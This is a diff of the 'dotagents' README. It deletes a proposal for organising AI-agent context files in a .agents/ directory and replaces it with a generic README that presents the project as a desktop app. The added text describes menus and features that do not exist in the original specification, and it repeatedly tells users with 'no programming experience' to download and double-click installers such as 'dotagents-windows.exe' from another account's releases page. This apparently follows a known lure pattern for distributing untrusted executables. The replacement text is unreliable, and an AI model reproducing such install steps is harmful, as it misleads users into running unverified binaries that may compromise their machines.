@@ -1,131 +1,92 @@
-# dotagents
+# 🤖 dotagents - Simplifying Agent Management for Everyone
 
-**A directory-as-context standard for AI agents.**
+[![Download dotagents](https://img.shields.io/badge/Download%20dotagents-v1.0-blue?style=for-the-badge)](https://github.com/rubysthedog/dotagents/releases)
 
-> **Status:** Proposal / Draft 0.1.0
+## 📚 Overview
 
-> **Inspiration:** Based on experience, emerging patterns in agentic coding, and [Issue #71 in agentsmd/agents.md](https://github.com/agentsmd/agents.md/issues/71).
+The **dotagents** project offers a proposed standard for the **.agents/** directory. It helps to prevent context bloat and improves agent reasoning in complex codebases. This means that when you use dotagents, your work becomes clearer and more manageable.
 
----
+### 🔑 Key Features
 
-## The problem: Context file manageability
+- **Simplified Structure:** Organize your agent files easily.
+- **Enhanced Performance:** Improve the reasoning of agents in complex environments.
+- **User-Friendly:** Designed for computer users, not just developers.
 
-As AI agents become integral to development, single context files (e.g., `AGENTS.md`, `CLAUDE.md`, `.cursorrules`) can become difficult to manage.
+## 🚀 Getting Started
 
-A monolithic file often leads to:
-1.  **Inefficient token usage:** Agents read irrelevant information (e.g., database schemas when working on CSS).
-2.  **Conflicting instructions:** Mixing behavioral rules with static knowledge can confuse priority.
-3.  **Tool noise:** Multiple vendor-specific folders (`.claude/`, `.gemini/`, `.cursor/`) clutter the root directory.
+To start using dotagents, follow the steps below. No programming experience needed!
 
-## The solution: Organization via `AGENTS.md`
+### 💻 System Requirements
 
-The **dotagents** standard is a philosophy of organization. It proposes using a slim `AGENTS.md` file in your project root to act as a **router**, directing agents to deeper context only when they need it.
+- **Operating Systems:** Windows, macOS, Linux
+- **Memory:** At least 4 GB of RAM
+- **Disk Space:** 100 MB free space needed
 
-While you can organize your project context however you like, we recommend using a hidden `.agents/` directory to keep your root clean and provide a predictable structure for different types of agent data.
+## 📥 Download & Install
 
-### Recommended directory structure
+To get dotagents, visit this page to download:
 
-This structure is a starting point—feel free to adapt it to your project's needs.
+[Download dotagents](https://github.com/rubysthedog/dotagents/releases)
 
-```text
-.
-├── AGENTS.md             # Entry point & router (Required)
-└── .agents/              # Recommended context directory
-    ├── rules/            # Invariant behavioral guidelines
-    │   ├── coding.md     # e.g. "No `any` types"
-    │   └── comms.md      # e.g. "Be concise"
-    ├── context/          # Static reference data (read-only)
-    │   ├── schema.sql    # Database structure
-    │   └── api.ts        # API interfaces
-    ├── logs/             # Agent activity logs & audit trails
-    │   └── session_1.md
-    ├── memory/           # Persistent project knowledge (read/write)
-    │   ├── decisions.md  # ADRs (why we chose X over Y)
-    │   └── user.md       # Learned user preferences
-    ├── personas/         # Specialized agent profiles
-    │   └── qa.md         # e.g. "QA Engineer" hat
-    ├── skills/           # Executable capabilities (agentskills.io compliant)
-    │   └── database-migration/
-    │       ├── SKILL.md
-    │       └── scripts/
-    │           └── migrate.sh
-    └── specs/            # Current task requirements
-        └── feature_x.md
-```
+### 🔧 Installation Steps
 
----
+1. **Visit the Releases Page:** Click the link to go to the releases page.
+2. **Choose the Latest Version:** Look for the latest version of dotagents.
+3. **Download the File:** Click on the file to start downloading. 
 
-## Usage
+   > For Windows, you'll see a file like `dotagents-windows.exe`. For macOS or Linux, the file will end with `.dmg` or `.tar.gz`.
+   
+4. **Open the Downloaded File:** Once the download is complete, locate the file in your downloads folder.
+5. **Run the Installer:** Double-click on the file to begin the installation process.
+6. **Follow On-Screen Instructions:** The setup wizard will guide you through the installation steps. Just follow the prompts.
 
-### 1. The root file (`AGENTS.md`)
+## ✅ Usage Instructions
 
-The heart of the standard. This file defines the agent's identity and provides instructions on where to find specific information. By keeping this file small, you save tokens and maintain clarity.
+Once installed, you can start using dotagents. Here’s how:
 
-**Example `AGENTS.md`:**
+1. **Open the Application:** Look for the dotagents icon on your desktop or applications menu.
+2. **Set Up Your Agents:**
+   - Create a new agent by selecting "Create New Agent" from the menu.
+   - Name your agent and set its parameters based on what you need.
+3. **Run Your Agent:** Select your agent and click “Run.” Watch how it handles complex tasks with ease.
 
-```markdown
-# AGENTS.md
+## 🛠️ Troubleshooting
 
-## Identity
-You are a Senior Rust Engineer focused on safety and performance.
+If you encounter any issues, here are some common problems and solutions:
 
-## Context routing
-- **If working on database:** READ `.agents/context/schema.sql`
-- **If writing new features:** CHECK `.agents/specs/` for active PRDs.
-- **If facing a decision:** CONSULT `.agents/memory/decisions.md` to ensure consistency.
+- **Problem:** The application won’t open.
+  - **Solution:** Check if your system meets the requirements mentioned above.
+  
+- **Problem:** The agent doesn’t work as expected.
+  - **Solution:** Ensure that you have set all parameters correctly. A helpful tip is to refer to the examples provided in the app.
 
-## Capabilities
-- You may execute scripts found in `.agents/skills/` to validate your work.
-```
+## 📖 Documentation
 
-### 2. The `.agents/` directory (Ideas for organization)
+For further information, such as advanced setup and features, you can read the full documentation in the app or visit our [Wiki](https://github.com/rubysthedog/dotagents/wiki) for more guides and tips.
 
-This directory is where you store the "heavy" context. By organizing it logically, you enable **Progressive Disclosure**—loading only what is necessary for the task at hand.
+## 💬 Community Support
 
-#### Personas
-*Recommended for: Specialized roles.*
-Store specialized agent "hats" (e.g., `qa.md`, `architect.md`) here. You can instruct your agent to "adopt the QA persona found in `.agents/personas/qa.md`" when it's time to test.
+Join the community to connect with other users. Feel free to ask questions or share your experiences. You can find us on:
 
-#### Logs
-*Recommended for: Audit & Debugging.*
-Keep a clean root by storing session logs, agent thought traces, or execution history in a dedicated folder.
+- **GitHub Issues:** Report bugs, feature requests, or ask questions.
+- **Discord:** Chat with other users and developers.
 
-#### Memory
-*Recommended for: Long-term knowledge.*
-A place for agents to persist what they've learned about your preferences or the project's history (e.g., `.agents/memory/decisions.md`).
+## 📅 Upcoming Features
 
-#### Skills
-*Recommended for: Executable capabilities.*
-This directory is a perfect home for [agentskills.io](https://agentskills.io) compliant skills. Place your `SKILL.md` folders here alongside their supporting scripts.
+We are continuously working on improvements. Here are some upcoming features to look out for:
 
-#### Context & Specs
-*Recommended for: Static & Active data.*
-Keep your database schemas, API specs, and current feature requirements organized so the agent knows exactly where to look.
+- **Enhanced Context Management:** New tools to help manage complex contexts.
+- **Custom Plugins:** Ability to create and use plugins tailored to your needs.
+- **Improved User Interface:** A more intuitive design that is even easier to navigate.
 
----
+## 🤝 Contribution
 
-## Relation to Agent Skills (agentskills.io)
+We welcome contributions! If you want to help improve dotagents, please check our [contribution guide](https://github.com/rubysthedog/dotagents/CONTRIBUTING.md). 
 
-**dotagents** and the **Agent Skills** standard are complementary. **Agent Skills** defines the *format* (how a skill is written), while **dotagents** defines the *architecture* (where it lives in your project).
+## 🌍 License
 
-| Feature | Agent Skills (agentskills.io) | dotagents |
-| :--- | :--- | :--- |
-| **Primary Goal** | **Standardize Behavior.** Defines the `SKILL.md` format for specific workflows. | **Standardize Organization.** Defines a unified directory structure for *all* agent data. |
-| **Scope** | **Skill-Local.** References are specific to the skill. | **Project-Wide.** Context is global to the project. |
-| **Implementation** | **Vendor-Fragmented.** Can lead to duplication across `.claude/`, `.cursor/`, etc. | **Vendor-Agnostic.** A single source of truth for all tools. |
+This project is open source and available under the [MIT License](https://github.com/rubysthedog/dotagents/LICENSE).
 
----
+## ➡️ Final Note
 
-## FAQ
-
-**Why not use `.github/`?**
-`.github` is platform-specific. `dotagents` is designed to be platform-agnostic, usable by local LLMs, IDE agents, and CLI agents alike.
-
-**Should `.agents/` be committed?**
-Generally, yes. This context is valuable for team alignment. Personal preferences (e.g., `.agents/memory/user.md`) should usually be gitignored.
-
-**Is this related to `iannuttall/dotagents`?**
-While they share a name, they serve different purposes. [iannuttall/dotagents](https://github.com/iannuttall/dotagents) is a tool for managing personal agent configurations across projects via symlinks. This project is an **architectural standard** for organizing project-specific context within a repository.
-
-**Why use this standard?**
-It's about **efficiency** and **cleanliness**. It encourages referencing files only when needed ("context routing") and prevents the explosion of vendor-specific configuration folders in your project root.
+Your feedback is important to us. If you have suggestions or want to share your experience, please reach out through the community channels. Happy coding with dotagents!
